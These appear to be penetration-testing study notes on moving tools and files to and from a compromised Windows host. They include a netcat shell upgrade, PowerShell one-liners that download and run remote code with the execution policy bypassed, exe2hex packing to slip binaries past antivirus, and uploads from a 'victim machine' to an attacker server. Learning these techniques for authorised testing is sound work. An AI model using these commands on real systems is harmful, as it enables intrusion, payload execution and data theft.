considerations
==============
dangers of transferring attack tools
	post-exploitation attack tools could be used by malicious parties which puts client's resources at risk
	antivirus software which scans endpoint filesystems in search of pre-defined file signatures becomes a huge frustrations for us during this phase
	so, try to use native tools on the compromised system first

============
preparations
============
ftp server
	installing Pure-FTPd on kali
	add ftp user and group(setup_ftpd.sh)

non-interactive shell
	ex. netcat
	non-interactive shell has many limits
	upgrade
		python -c 'import pty; pty.spawn("/bin/bash")'

====================================
transferring file with windows hosts
====================================
non-interactive ftp download
	make ftp command file
		echo <command> >> <filename>
		ex.ftp.txt
	run the file
		ftp -v -n -s:<filename>
download using scripting languages
	make echoing script
		VBScript : wget.vbs
		PowerShell : wget.ps1
		use convert_to_non-interactive_shell.py
	copy the echoing script
	paste to the shell
	run the script
		VBScript : cscript wget.vbs <target url> <output file>
		PowerShell : powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	one liner
	  simple download
		powershell.exe (New-Object System.Net.WebClient).DownloadFile('<target url>', '<output file>')
	  run the target url's commands without saving
		powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<target url>')

downloads with exe2hex and powershell
	use packer to compress the binary file
		upx -9 <binary file>
	make exe to run with echo command
		exe2hex -x <binary file> -p <output file>
	copy the output file content
	paste it on the victim machine

uploads using windows scripting languages
	php
		make a upload php file into attacker machine(upload.php)
		powershell (New-Object System.Net.Weblient).UploadFile('<target url>', '<upload file>')

uploads with TFTP(up to XP...)
	install tftp
	make directory and give permission(own by nobody:)
	sudo atftpd --daemon --port 69 /tftp
	tftp -i <target ip> put <filename>
